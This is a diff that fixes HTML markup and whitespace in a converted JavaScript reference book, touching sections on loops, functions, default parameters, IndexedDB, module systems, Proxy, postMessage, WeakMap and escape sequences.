@@ -9539,7 +9539,7 @@ for technical reasons. Continue reading to see an example.)</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch17-4">Section 17.4: Undefined</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p>Declared variable without a value will have the value <b>undefined</h4>
+<p>Declared variable without a value will have the value <b>undefined</b>.</p>
 
 <pre>
 <b>var</b> a;
@@ -9704,6 +9704,7 @@ conflict with libraries and the proper functioning of a script.
 Therefore global variables should be declared and initialized using
 the <b>var</b> keyword in the context of the window object, instead, so
 that the intent is explicitly stated.</p>
+
 <p>Additionally, variables may be declared several at a time by
 separating each declaration (and optional value assignment) with a
 comma. Using this syntax, the var and let keywords need only be used
@@ -9849,7 +9850,7 @@ a b c
 
 <p>for&hellip;of works on Set objects.</p>
 
-<h4>Note</b>:</p>
+<h4>Note:</p>
 
 <ul>
   <li>A Set object will eliminate duplicates.</li>
@@ -9876,9 +9877,12 @@ alejandro<br/>
 zandra<br/>
 anna
 </blockquote>
+
 <h4>Maps</h4>
+
 <p>You can also use for&hellip;of loops to iterate over Maps. This works
 similarly to arrays and sets, except the iteration variable stores both a key and a value.</p>
+
 <pre>
 <b>const</b> map = <b>new</b> Map()
   .<b>set</b>(&apos;abc&apos;, 1)
@@ -9897,10 +9901,10 @@ similarly to arrays and sets, except the iteration variable stores both a key an
 <b>for</b> (<b>const</b> &lbrack;key, value&rbrack; of map) {
   console.log(key &plus; &apos; is mapped to &apos; &plus; value)
 }
-<i>/&ast;Logs:</i>
+/&ast; <i>Logs:</i>
   <i>abc is mapped to 1</i>
   <i>def is mapped to 2</i>
-<i>&ast;/</i>
+&ast;/
 </pre>
 
 <h4>Objects</h4>
@@ -10783,7 +10787,8 @@ foo();
 <p>This use of anonymous functions is covered in more detail in Functions
 as a variable</p>
 
-<p><b>Supplying an Anonymous Function as a Parameter to Another Function</h4>
+<h4>Supplying an Anonymous Function as a Parameter to Another Function</h4>
+
 <p>Some functions may accept a reference to a function as a parameter.
 These are sometimes referred to as &quot;dependency injections&quot; or 
 &quot;callbacks&quot;, because it allows the function your calling to 
@@ -10791,6 +10796,7 @@ These are sometimes referred to as &quot;dependency injections&quot; or
 the way the called function behaves. For example, the Array object&apos;s 
 map function allows you to iterate over each element of an array, then build 
 a new array by applying a transform function to each element.</p>
+
 <pre>
 <b>var</b> nums = &lbrack;0, 1, 2&rbrack;;
 <b>var</b> doubledNums = nums.map( <b>function</b>(element){ <b>return</b> element &ast; 2; }); // <i>&lbrack;0,2,4&rbrack;</i>
@@ -10835,21 +10841,21 @@ example:</p>
 &lt;!&minus;&minus; My Script &minus;&minus;&gt;
 <b>&lt;script&gt;</b>
 function initialize() {
-  // foo is safely hidden within initialize, but&hellip;
+  // <i>foo is safely hidden within initialize, but&hellip;</i>
   var foo = &apos;&apos;;
 }
-// &hellip;my initialize function is now accessible from global scope.
-// There is a risk someone could call it again, probably by accident.
+// <i>&hellip;my initialize function is now accessible from global scope.</i>
+// <i>There is a risk someone could call it again, probably by accident.</i>
 initialize();
 <b>&lt;/script&gt;</b>
 
 <b>&lt;script&gt;</b>
-// Using an anonymous function, and then immediately
-// invoking it, hides my foo variable and guarantees
-// no one else can call it a second time.
+// <i>Using an anonymous function, and then immediately</i>
+// <i>invoking it, hides my foo variable and guarantees</i>
+// <i>no one else can call it a second time.</i>
 (function() {
   var foo = &apos;&apos;;
-}()) // &lt;&minus;&minus; the parentheses invokes the function immediately
+}()) // <i>&lt;&minus;&minus; the parentheses invokes the function immediately</i>
 <b>&lt;/script&gt;</b>
 </pre>
 
@@ -10942,8 +10948,8 @@ assigned in the following way:</p>
 <pre>
 <b>function</b> printMsg(msg) {
 msg = <b>typeof</b> msg !== &apos;undefined&apos; ? // <i>if a value was provided</i>
-  msg :                                            // <i>then, use that value in the reassignment</i>
-  &apos;Default value for msg.&apos;;              // <i>else, assign a default value</i>
+  msg :                                // <i>then, use that value in the reassignment</i>
+  &apos;Default value for msg.&apos;;         // <i>else, assign a default value</i>
 console.log(msg); 
 }
 </pre>
@@ -10970,17 +10976,19 @@ explicitly providing it in the following example (using an arrow function):</p>
 
 <pre>
 <b>let</b> param_check = (p = &apos;str&apos;) =&gt; console.log(p &plus; &apos; is of type: &apos; &plus; <b>typeof</b> p);
-param_check();  // <i>-&amp;quot;str is of type: string&quot;</i>
-param_check(<b>undefined</b>);  // <i>-&amp;quot;str is of type: string&quot;</i>
-param_check(1);  // <i>-&amp;quot;1 is of type: number&quot;</i>
-param_check(<b>this</b>);  // <i>-&amp;quot;&lbrack;object Window&rbrack; is of type: object&quot;</i>
+param_check();  // <i>-&quot;str is of type: string&quot;</i>
+param_check(<b>undefined</b>);  // <i>-&quot;str is of type: string&quot;</i>
+param_check(1);  // <i>-&quot;1 is of type: number&quot;</i>
+param_check(<b>this</b>);  // <i>-&quot;&lbrack;object Window&rbrack; is of type: object&quot;</i>
 </pre>
 
 <h4>Functions/variables as default values and reusing parameters</h4>
 
 <p>The default parameters&apos; values are not restricted to numbers, strings
 or simple objects. A function can also be set as the default value callback = function(){}:</p>
+
 <h5>Version ≥ 6</h5>
+
 <pre>
 <b>function</b> foo(callback = <b>function</b>(){ console.log(&apos;default&apos;); }) {
   callback();
@@ -11030,8 +11038,8 @@ add(1, 2, 5, 10);       // <i>8, 20</i>
   array.push(value);
   <b>return</b> array;
 }
-add(5);     // <i>&lbrack;5&rbrack;</i>
-add(6);     // <i>&lbrack;6&rbrack;, not &lbrack;5, 6&rbrack;</i>
+add(5);          // <i>&lbrack;5&rbrack;</i>
+add(6);          // <i>&lbrack;6&rbrack;, not &lbrack;5, 6&rbrack;</i>
 add(6, add(5));  // <i>&lbrack;5, 6&rbrack;</i>
 </pre>
 
@@ -11048,8 +11056,8 @@ function is invoked:</p>
   console.info(arguments.length, arguments);
   console.log(a, b);
 }
-foo();  // <i>info: 0 &gt;&amp;lbrack;&rbrack; &vert; log: 1, 2</i>
-foo(4);  // <i>info: 1 &gt;&amp;lbrack;4&rbrack; &vert; log: 4, 5</i>
+foo();      // <i>info: 0 &gt;&amp;lbrack;&rbrack; &vert; log: 1, 2</i>
+foo(4);     // <i>info: 1 &gt;&amp;lbrack;4&rbrack; &vert; log: 4, 5</i>
 foo(5, 6);  // <i>info: 2 &gt;&amp;lbrack;5, 6&rbrack; &vert; log: 5, 6</i>
 </pre>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -11063,6 +11071,7 @@ apply.</p>
 object that they are a property of) can be repurposed to operate on
 another, compatible object. Additionally, arguments can be given in
 one shot as arrays, similar to the spread (&hellip;) operator in ES6.</p>
+
 <pre>
 <b>let</b> obj = {
   a: 1,
@@ -11080,7 +11089,7 @@ console.log(obj);  // <i>prints { a: 3, b: 5 }</i>
 myObj.<b>set</b>(5, 4);  // <i>fails; myObj has no &grave;set&grave; property</i>
 obj.<b>set</b>.call(myObj, 5, 4); // <i>success; &grave;this&grave; in set() is re-routed to myObj instead of obj</i>
 obj.<b>set</b>.apply(myObj, &lbrack;5, 4&rbrack;); // <i>same as above; note the array</i>
-
+<br>
 console.log(myObj); // <i>prints { a: 3, b: 5 }</i>
 </pre>
 
@@ -21678,8 +21687,10 @@ request.onerror = <b>function</b>() {
 happens in a transaction. There are a few things to note about
 transactions that are mentioned in the Remarks section at the bottom
 of this page.</p>
+
 <p>We&apos;ll use the database we set up in <b>Opening a database.</b></p>
 <!-- page 368 -->
+
 <pre>
 // <i>Create a new readwrite (since we want to change things) transaction for the things store</i>
 <b>var</b> transaction = db.transaction(&lbrack;&quot;things&quot;&rbrack;, &quot;readwrite&quot;);
@@ -21712,11 +21723,14 @@ thingsToAdd.forEach(e =&gt; store.add(e));
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch72-3">Section 72.3: Retrieving data</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+
 <p>Anything that needs to happen with data in an IndexedDB database
 happens in a transaction. There are a few things to note about
 transactions that are mentioned in the Remarks section at the bottom
 of this page.</p>
+
 <p>We&apos;ll use the database we set up in Opening a database.</p>
+
 <pre>
 // <i>Create a new transaction, we&apos;ll use the default &quot;readonly&quot; mode and the things store</i>
 <b>var</b> transaction = db.transaction(&lbrack;&quot;things&quot;&rbrack;);
@@ -21760,14 +21774,17 @@ checking for the presence of the window.indexedDB property:</p>
 <h3 id="ch73-1">Section 73.1: ES6 Modules</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h5>Version ≥ 6</h5>
+
 <p>In ECMAScript 6, when using the module syntax (import/export), each
 file becomes its own module with a private namespace. Top-level
 functions and variables do not pollute the global namespace. To expose
 functions, classes, and variables for other modules to import, you can
 use the export keyword.</p>
+
 <p><b>Note:</b> Although this is the official method for creating JavaScript
 modules, it is not supported by any major browsers right now. However,
 ES6 Modules are supported by many transpilers.</p>
+
 <pre>
 export <b>function</b> greet(name) {
   console.log(&quot;Hello %s!&quot;, name);
@@ -21780,22 +21797,31 @@ export class MyClass {
   test() {}
 }
 </pre>
+
 <h4>Using Modules</h4>
+
 <p>Importing modules is as simple as specifying their path:</p>
+
 <pre>
 import greet from &quot;mymodule.js&quot;;
 greet(&quot;Bob&quot;);
 </pre>
+
 <p>This imports only the myMethod method from our mymodule.js file.</p>
+
 <p>It&apos;s also possible to import all methods from a module:</p>
+
 <pre>
 import &ast; as myModule from &quot;mymodule.js&quot;;
 myModule.greet(&quot;Alice&quot;);
 </pre>
+
 <p>You can also import methods under a new name:</p>
+
 <pre>
 import { greet as A, myMethod as B } from &quot;mymodule.js&quot;;
 </pre>
+
 <p>More information on ES6 Modules can be found in the Modules topic.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch73-2">Section 73.2: Universal Module Definition (UMD)</h3>
@@ -21803,8 +21829,10 @@ import { greet as A, myMethod as B } from &quot;mymodule.js&quot;;
 <p>The UMD (Universal Module Definition) pattern is used when our module
 needs to be imported by a number of different module loaders (e.g.
 AMD, CommonJS).</p>
+
 <p>The pattern itself consists of two parts:</p>
 <!-- page 371 -->
+
 <ol type="1" start="1">
   <li>An IIFE (Immediately-Invoked Function Expression) that checks for
     the module loader that is being implemented by the user. This will
@@ -21815,9 +21843,11 @@ AMD, CommonJS).</p>
     passed any number of arguments to specify the dependencies of the
     module.</li>
 </ol>
+
 <p>In the below example we check for AMD, then CommonJS. If neither of
 those loaders are in use we fall back to making the module and its
 dependencies available globally.</p>
+
 <pre>
 (<b>function</b> (root, factory) {
   <b>if</b> (<b>typeof</b> define === &apos;function&apos; && define.amd) {
@@ -21842,6 +21872,7 @@ dependencies available globally.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>Immediately invoked function expressions can be used to create a
 private scope while producing a public API.</p>
+
 <pre>
 <b>var</b> Module = (<b>function</b>() {
   <b>var</b> privateData = 1;
@@ -21854,13 +21885,16 @@ private scope while producing a public API.</p>
 Module.getPrivateData(); // <i>1</i>
 Module.privateData;      // <i>undefined</i>
 </pre>
+
 <p>See the Module Pattern for more details.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch73-4">Section 73.4: Asynchronous Module Definition (AMD)</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>AMD is a module definition system that attempts to address some of the
 common issues with other systems like CommonJS and anonymous closures.</p>
+
 <p>AMD addresses these issues by:</p>
+
 <ul>
   <li>Registering the factory function by calling define(), instead of
     immediately executing it</li>
@@ -21870,10 +21904,13 @@ common issues with other systems like CommonJS and anonymous closures.</p>
     been loaded and executed</li>
   <li>Passing the dependent modules as arguments to the factory function</li>
 </ul>
+
 <p>The key thing here is that a module can have a dependency and not hold
 everything up while waiting for it to load, without the developer
 having to write complicated code.</p>
+
 <p>Here&apos;s an example of AMD:</p>
+
 <pre>
 // <i>Define a module &quot;myModule&quot; with two dependencies, jQuery and Lodash</i>
 define (&quot;myModule&quot;, &lbrack;&quot;jquery&quot;, &quot;lodash&quot;&rbrack;, <b>function</b>(&dollar;,&lowbar;) {
@@ -21893,16 +21930,22 @@ define (&quot;myModule&quot;, &lbrack;&quot;jquery&quot;, &quot;lodash&quot;&rbr
   <b>return</b> myModule;
 });
 </pre>
+
 <p>Modules can also skip the name and be anonymous. When that&apos;s done,
 they&apos;re usually loaded by file name.</p>
+
 <pre>
 define(&lbrack;&quot;jquery&quot;, &quot;lodash&quot;&rbrack;, <b>function</b>(&dollar;,&lowbar;) { <i>/&ast; factory &ast;/</i> });
 </pre>
+
 <p>They can also skip dependencies:</p>
+
 <pre>
 define (<b>function</b>() { <i>/&ast; factory &ast;/</i> });
 </pre>
+
 <p>Some AMD loaders support defining modules as plain objects:</p>
+
 <pre>
 define(&quot;myModule&quot;, {version: 1, value: &quot;sample string&quot; });
 </pre>
@@ -21910,9 +21953,12 @@ define(&quot;myModule&quot;, {version: 1, value: &quot;sample string&quot; });
 <h3 id="ch73-5">Section 73.5: CommonJS - Node.js</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>CommonJS is a popular modularization pattern that&apos;s used in Node.js.</p>
+
 <p>The CommonJS system is centered around a require() function that loads other
 modules and an exports property that lets modules export publicly accessible methods.</p>
+
 <p>Here&apos;s an example of CommonJS, we&apos;ll load Lodash and Node.js&apos; fs
+
 module:</p>
 <pre>
 // <i>Load fs and lodash, we can use them anywhere inside the module</i>
@@ -21954,6 +22000,7 @@ module.exports = <b>function</b>() {
     </tr>
   </tbody>
 </table>
+
 <p>A Proxy in JavaScript can be used to modify fundamental operations on
 objects. Proxies were introduced in ES6. A
 Proxy on an object is itself an object, that has <i>traps</i>. Traps may be
@@ -21965,11 +22012,13 @@ operation is performed on the proxied object as if there was no Proxy.</p>
 <h3 id="ch74-1">Section 74.1: Proxying property lookup</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>To influence property lookup, the <b>get</b> handler must be used.</p>
+
 <p>In this example, we modify property lookup so that not only the value,
 but also the type of that value is returned. We use 
 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Reflect" 
 target="_blank" rel="noopener noreferrer">
 Reflect</a> to ease this.</p>
+
 <pre>
 <b>let</b> handler = {
   <b>get</b>(target, property) {
@@ -21994,6 +22043,7 @@ console.log(proxied.foo); // <i>logs &grave;Object {value: &quot;bar&quot;, type
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>This proxy simply appends the string &quot; went through proxy&quot; to every
 string property set on the target object.</p>
+
 <pre>
 <b>let</b> object = {};
 <b>let</b> handler = {
@@ -22009,38 +22059,45 @@ console.log(object);
 // <i>logs: { example: &quot;ExampleValue went through proxy&quot; }</i>
 // <i>you could also access the object via proxied.target</i>
 </pre>
+
 <!-- page 375/376 -->
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h2 id="ch75">Chapter 75: .postMessage() and MessageEvent</h2>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<h4>Parameters</b><br/>
-<b>message</b><br/>
-<b>targetOrigin</b></p>
-<p>transfer &nbsp;&nbsp;&nbsp; optional</p>
+<h4>Parameters<br/>
+message<br/>
+targetOrigin<br/>
+transfer &nbsp;&nbsp;&nbsp; optional</h4>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch75-1">Section 75.1: Getting Started</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h4>What is <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" 
 target="_blank" rel="noopener noreferrer">.postMessage()</a>,
 when and why do we use it</h4>
+
 <p><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" 
 target="_blank" rel="noopener noreferrer"><b>postMessage</a> 
 method is a way to safely allow communication between cross-origin scripts.</b></p>
+
 <p>Normally, two different pages, can only directly communicate with each
 other using JavaScript when they are under the same origin, even if
 one of them is embedded into another (e.g. iframes) or one is opened
 from inside the other (e.g. window.open()). With .postMessage(), you can work around this
 restriction while still stayig safe.</p>
+
 <p><b>You can only use <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" 
 target="_blank" rel="noopener noreferrer">
 postMessage()</a> when you have access to both pages&apos; JavaScript code.</b> Since the
 receiver needs to validate the sender and process the message accordingly, you can only use this 
 method to communicate between two scripts you have access to.</p>
+
 <p>We will build an example to send messages to a child window and have
 the messages be displayed on the child window. The parent/sender page
 will be assumed to be http://sender.com and child/receiver page will be 
 assumed to be http://receiver.com for the example.</p>
+
 <h4>Sending messages</h4>
+
 <p>In order to send messages to another window, you need to have a
 reference to its <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window" 
 target="_blank" rel="noopener noreferrer">window</a>
@@ -22051,18 +22108,23 @@ methods to obtain a reference to a window object, see the explanation
 under otherWindow parameter 
 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage#Syntax" 
 target="_blank" rel="noopener noreferrer">here</a>.</p>
+
 <pre>
 <b>var</b> childWindow = window.open(&quot;http://receiver.com&quot;, &quot;&lowbar;blank&quot;);
 </pre>
+
 <p>Add a textarea and a send button that will be used to send messages to child window.</p>
+
 <pre>
 <b>&lt;textarea</b> id=&quot;text&quot;<b>&gt;&lt;/textarea&gt;</b>
 <b>&lt;button</b> id=&quot;btn&quot;<b>&gt;</b>Send Message<b>&lt;/button&gt;</b>
 </pre>
+
 <p>Send the text of textarea using 
 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" 
 target="_blank" rel="noopener noreferrer">
 .postMessage(message, targetOrigin)</a> when the button is clicked.</p>
+
 <pre>
 <b>var</b> btn = document.getElementById(&quot;btn&quot;),
   text = document.getElementById(&quot;text&quot;);
@@ -22078,7 +22140,9 @@ btn.addEventListener(&quot;click&quot;, <b>function</b>() {
     }), &apos;http://receiver.com&apos;);
 }
 </pre>
+
 <!-- page 377 -->
+
 <p>In order send and receive JSON objects instead of a simple string, 
 <a href="https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify" 
 target="_blank" rel="noopener noreferrer">
@@ -22092,33 +22156,42 @@ Transfarable Object</a> can be given as the third optional parameter of the
 target="_blank" rel="noopener noreferrer">
 .postMessage(message,targetOrigin,transfer)</a> method, but browser support 
 is still lacking even in modern browsers.</p>
+
 <p>For this example, since our receiver is assumed to be http://receiver.com page, 
 we enter its url as the targetOrigin. The value of this parameter should match
 the origin of the childWindow object for the message to be send. It is
 possible to use &ast; as a wildcard but is <b>highly recommended</b> to
 avoid using the wildcard and always set this parameter to receiver&apos;s
 specific origin <b>for security reasons</b>.</p>
+
 <h4>Receiving, Validating and Processing Messages</h4>
+
 <p>The code under this part should be put in the receiver page, which is
 http://receiver.com for our example.</p>
+
 <p>In order to receive messages, the 
 <a href="https://developer.mozilla.org/en-US/docs/Web/Events/message_webmessaging" 
 target="_blank" rel="noopener noreferrer">
 message event</a> of the window should be listened.</p>
+
 <pre>
 window.addEventListener(&quot;message&quot;, receiveMessage);
 </pre>
+
 <p>When a message is received there are a couple of <b>steps that should
 be followed to assure security as much as possible</b>.</p>
+
 <ul>
   <li>Validate the sender</li>
   <li>Validate the message</li>
   <li>Process the message</li>
 </ul>
+
 <p>The sender should always be validated to make sure the message is
 received from a trusted sender. After that, the message itself should
 be validated to make sure nothing malicious is received. After these
 two validations, the message can be processed.</p>
+
 <pre>
 <b>function</b> receiveMessage(ev) {
   // <i>Check event.origin to see if it is a trusted sender.</i>
@@ -22142,6 +22215,7 @@ two validations, the message can be processed.</p>
   document.getElementById(&quot;console&quot;).appendChild(p);
 }
 </pre>
+
 <p><a href="https://jsfiddle.net/ozzan/6gjstodk/" 
 target="_blank" rel="noopener noreferrer">Click here for a JS Fiddle showcasing its usage.</p>
 <!-- page 378/379 -->
@@ -22168,6 +22242,7 @@ two-element arrays.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>To get a value associated to the key, use the method. If there&apos;s no
 value associated to the key, it returns <b>undefined</b>.</p>
+
 <pre>
 <b>const</b> obj1 = {},
      obj2 = {};
@@ -22195,6 +22270,7 @@ console.log(weakmap.<b>get</b>(obj2)); // <i>2</i>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>To check if an element with a specified key exits in a WeakMap, use the 
 .has() method. It returns <b>true</b> if it exits, and otherwise<b>false</b>.</p>
+
 <pre>
 <b>const</b> obj1 = {},
       obj2 = {};
@@ -22203,12 +22279,14 @@ console.log(weakmap.<b>get</b>(obj2)); // <i>2</i>
 console.log(weakmap.has(obj1));  // <i>true</i>
 console.log(weakmap.has(obj2));  // <i>false</i>
 </pre>
+
 <!-- page 380 -->
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch76-5">Section 76.5: Removing an element with the key</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>To remove an element with a specified key, use the .delete() method. It
 returns <b>true</b> if the element existed and has been removed, otherwise <b>false</b>.</p>
+
 <pre>
 <b>const</b> obj1 = {},
       obj2 = {};
@@ -22230,6 +22308,7 @@ contribute to reference count of an object, therefore it is very useful to solve
 target="_blank" rel="noopener noreferrer">leak problems</a>.</p>
 <p>Here is a demo of weakmap. I use a very large object as value to show
 that weak reference does not contribute to reference count.</p>
+
 <pre>
 // <i>manually trigger garbage collection to make sure that we are in good status.</i>
 &gt; global.gc();
@@ -22346,6 +22425,7 @@ console.log(weakset.has(obj2)); // <i>false</i>
 console.log(weakset.<b>delete</b>(obj1)); // <i>true</i>
 console.log(weakset.<b>delete</b>(obj2)); // <i>false</i>
 </pre>
+
 <!-- page 383 -->
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h2 id="ch78">Chapter 78: Escape Sequences</h2>
@@ -22358,6 +22438,7 @@ expression literals just as they are, e.g.</p>
 <b>var</b> str = &quot;ポケモン&quot;; // <i>a valid string</i>
 <b>var</b> regExp = <i>/&lbrack;</i>Α<i>-</i>Ωα<i>-</i>ω<i>&rbrack;/</i>; // <i>matches any Greek letter without diacritics</i>
 </pre>
+
 <p>In order to add arbitrary characters to a string or regular expression, including 
 non-printable ones, one has to use <i>escape sequences</i>. Escape sequences consist 
 of a backslash (&quot;&bsol;&bsol;quot;) followed by one or more other characters. 
@@ -22431,82 +22512,114 @@ character that follows the backslash. While similar to nonescape sequences,
 where the leading backslash is simply ignored (i.e. &bsol;&bsol;? for ?), they
 are explicitly treated as single character escape sequences inside
 strings as per the specification.</p>
+
 <h4>Hexadecimal escape sequences</h4>
 <!-- page 384 -->
+
 <p>Characters with codes between 0 and 255 can be represented with an
 escape sequence where &bsol;&bsol;x is followed by the 2-digit hexadecimal
 character code. For example, the non-breaking space character has code
 160 or A0 in base 16, and so it can be written as &bsol;&bsol;xa0.</p>
+
 <pre>
 <b>var</b> str = &quot;ONE<b>&bsol;x</b>a0LINE&quot;; // <i>ONE and LINE with a non-breaking space between them</i>
 </pre>
+
 <p>For hex digits above 9, the letters a to f are used, in lowercase or uppercase 
 without distinction.</p>
+
 <pre>
+
 <b>var</b> regExp1 = <i>/&lbrack;&bsol;x00-xff&rbrack;/</i>; // <i>matches any character between U+0000 and U+00FF</i>
 <b>var</b> regExp2 = <i>/&lbrack;&bsol;x00-xFF&rbrack;/</i>; // <i>same as above</i>
 </pre>
+
 <h4>4-digit Unicode escape sequences</h4>
+
 <p>Characters with codes between 0 and 65535 (216 - 1) can be represented
 with an escape sequence where &bsol;&bsol;u is followed by the 4-digit
 hexadecimal character code.</p>
+
 <p>For example, the Unicode standard defines the right arrow character
 (&quot;?&quot;) with the number 8594, or 2192 in hexadecimal format. So an
 escape sequence for it would be &bsol;u2192.</p>
+
 <p>This produces the string &quot;A ? B&quot;:</p>
+
 <pre>
 <b>var</b> str = &quot;A <b>&bsol;u</b>2192 B&quot;;
 </pre>
+
 <p>For hex digits above 9, the letters a to f are used, in lowercase or
 uppercase without distinction. Hexadecimal codes shorter than 4 digits
 must be left-padded with zeros: &bsol;&bsol;u007A for the small letter &quot;z&quot;.</p>
+
 <h4>Curly bracket Unicode escape sequences</h4>
+
 <h5>Version ≥ 6</h5>
+
 <p>ES6 extends Unicode support to the full code range from 0 to 0x10FFFF.
 In order to escape characters with code greater than 216 - 1, a new
 syntax for escape sequences was introduced:</p>
+
 <pre>
 &bsol;u{???}
 </pre>
+
 <p>Where the code in curly braces is hexadecimal representation of the code point value, e.g.</p>
+
 <pre>
 alert(&quot;Look! <b>&bsol;u</b>{1f440}&quot;); // <i>Look! ????</i>
 </pre>
+
 <p>In the example above, the code 1f440 is the hexadecimal representation of the 
 character code of the Unicode Character <i>Eyes</i>.</p>
+
 <p>Note that the code in curly braces may contain any number of hex
 digits, as long the value does not exceed 0x10FFFF. For hex digits
 above 9, the letters a to f are used, in lowercase or uppercase
 without distinction.</p>
+
 <p>Unicode escape sequences with curly braces only work inside strings,
 not inside regular expressions!</p>
+
 <h4>Octal escape sequences</h4>
+
 <p>Octal escape sequences are deprecated as of ES5, but they are still
 supported inside regular expressions and in non-strict mode also
 inside non-template strings. An octal escape sequence consists of one,
 two or three octal digits, with value between 0 and 3778 = 255.</p>
+
 <p>For example, the capital letter &quot;E&quot; has character code 69, or 105 in
 base 8. So it can be represented with the escape sequence &bsol;105:</p>
 <!-- page 385 -->
+
 <pre>
 /&bsol;105scape/.test(&quot;Fun with Escape Sequences&quot;); // <i>true</i>
 </pre>
+
 <p>In strict mode, octal escape sequences are not allowed inside strings
 and will produce a syntax error. It is worth to note that &bsol;0, unlike
 &bsol;00 or &bsol;000, is <i>not</i> considered an octal escape sequence, and is
 thus still allowed inside strings (even template strings) in strict mode.</p>
+
 <b>Control escape sequences</b>
+
 <p>Some escape sequences are only recognized inside regular expression
 literals (not in strings). These can be used to escape characters with
 codes between 1 and 26 (U+0001U+001A). They consist of a single
 letter AZ (case makes no difference) preceded by &bsol;&bsol;c. The alphabetic
 position of the letter after &bsol;&bsol;c determines the character code.</p>
+
 <p>For example, in the regular expression</p>
+
 <pre>
 &grave;/&bsol;cG/&grave;
 </pre>
+
 <p>The letter &quot;G&quot; (the 7th letter in the alphabet) refers to the
 character U+0007, and thus</p>
+
 <pre>
 &grave;/&bsol;cG&grave;/.test(String.fromCharCode(7)); // <i>true</i>
 </pre>
@@ -22524,6 +22637,7 @@ whenever an event occurs. If you&apos;ve ever used
 <a href="https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener" 
 target="_blank" rel="noopener noreferrer">
 addEventListener</a> then you&apos;ve utilized the Observer pattern.</p>
+
 <pre>
 <b>function</b> Subject() {
   <b>this</b>.observers = &lbrack;&rbrack;; // <i>Observers listening to the subject</i>
